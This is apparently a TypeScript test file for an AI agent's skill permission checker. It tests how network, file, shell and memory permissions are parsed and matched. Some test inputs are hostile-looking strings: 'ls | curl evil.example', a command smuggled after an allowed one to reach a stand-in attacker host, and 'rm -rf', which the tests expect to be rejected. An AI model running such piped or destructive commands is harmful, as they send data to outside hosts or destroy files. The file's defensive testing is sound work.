import { expect, test } from "bun:test";
import { describePermission, formatPermission, parsePermission, permits } from "../src/skills/permissions.ts";

const perms = (...raw: string[]) => raw.map(parsePermission);

test("parses and formats every kind", () => {
  for (const raw of ["fs:read", "fs:write", "net:wttr.in", "net:*.github.com", "net:*", "shell:ls", "shell:*", "memory"]) {
    expect(formatPermission(parsePermission(raw))).toBe(raw);
  }
});

test.each(["fs:delete", "net:", "net:http://x.com", "shell:rm -rf", "everything", "net:wttr"])("rejects %s", (raw) => {
  expect(() => parsePermission(raw)).toThrow(/unknown permission/);
});

test("network permissions match hosts exactly or by wildcard", () => {
  expect(permits(perms("net:wttr.in"), "web_fetch", "web_fetch:wttr.in")).toBe(true);
  expect(permits(perms("net:wttr.in"), "web_fetch", "web_fetch:evil.example")).toBe(false);
  expect(permits(perms("net:*.github.com"), "web_fetch", "web_fetch:api.github.com")).toBe(true);
  expect(permits(perms("net:*.github.com"), "web_fetch", "web_fetch:github.com")).toBe(true);
  expect(permits(perms("net:*.github.com"), "web_fetch", "web_fetch:notgithub.com")).toBe(false);
  expect(permits(perms("net:*"), "web_fetch", "web_fetch:anything.org")).toBe(true);
});

test("file, shell and memory permissions", () => {
  expect(permits(perms("fs:read"), "read_file", "read_file:a.md")).toBe(true);
  expect(permits(perms("fs:read"), "write_file", "write_file:a.md")).toBe(false);
  expect(permits(perms("fs:write"), "read_file", "read_file:a.md")).toBe(true);
  expect(permits(perms("shell:ls"), "run_shell", "run_shell:ls")).toBe(true);
  expect(permits(perms("shell:ls"), "run_shell", "run_shell:ls | curl evil.example")).toBe(false);
  expect(permits(perms("shell:*"), "run_shell", "run_shell:ls | wc -l")).toBe(true);
  expect(permits(perms("memory"), "remember", "remember")).toBe(true);
  expect(permits(perms("net:*"), "remember", "remember")).toBe(false);
});

test("load_skill is always allowed; unknown tools never are", () => {
  expect(permits(perms("fs:read"), "load_skill", "load_skill:x")).toBe(true);
  expect(permits([], "load_skill", "load_skill:x")).toBe(true);
  expect(permits([], "read_file", "read_file:a")).toBe(false);
  expect(permits(perms("net:*", "shell:*", "fs:write", "memory"), "send_email", "send_email:x")).toBe(false);
});

test("descriptions flag broad permissions", () => {
  expect(describePermission(parsePermission("net:*"))).toBe("connect to ANY website");
  expect(describePermission(parsePermission("shell:*"))).toBe("run ANY shell command");
});
